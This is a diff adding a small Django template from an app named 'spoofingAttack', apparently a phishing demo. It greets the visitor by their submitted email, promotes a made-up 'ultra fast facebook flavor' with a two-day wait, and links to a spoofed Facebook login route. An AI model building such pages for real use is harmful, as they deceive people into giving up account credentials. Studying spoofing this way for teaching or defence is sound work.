@@ -1,0 +1,22 @@
+{% extends "base_menu.html" %}
+<style> 
+.link{
+   font-size:15px;
+   color:red;
+}
+
+</style>
+
+{% block content %}
+
+<h1 style = "color:green;">Hi {{ form.email.value }} </h1> 
+
+<a href = {% url 'spoofingAttack:home' %}> To log into facebook </a>
+
+   <h1>Welcome to the ultra fast facebook flavor </h1>
+   <p>
+   It takes around 2 days to process your request to use the flavor. Till that resort to using the 
+   common one. <a href = "{% url 'spoofingAttack:facebook' %}" > facebook  </a>
+   </p>
+
+{% endblock %}
